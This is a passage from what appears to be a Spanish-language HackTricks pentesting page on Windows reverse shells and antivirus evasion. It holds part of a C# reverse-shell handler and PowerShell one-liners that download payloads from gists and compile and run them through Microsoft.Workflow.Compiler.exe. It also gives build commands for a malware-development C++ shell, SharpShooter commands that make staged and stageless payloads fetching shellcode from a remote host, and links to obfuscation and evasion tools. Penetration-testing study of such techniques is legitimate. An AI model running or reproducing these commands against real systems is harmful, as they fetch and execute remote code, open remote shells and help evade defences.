private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)

### C# utilizando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
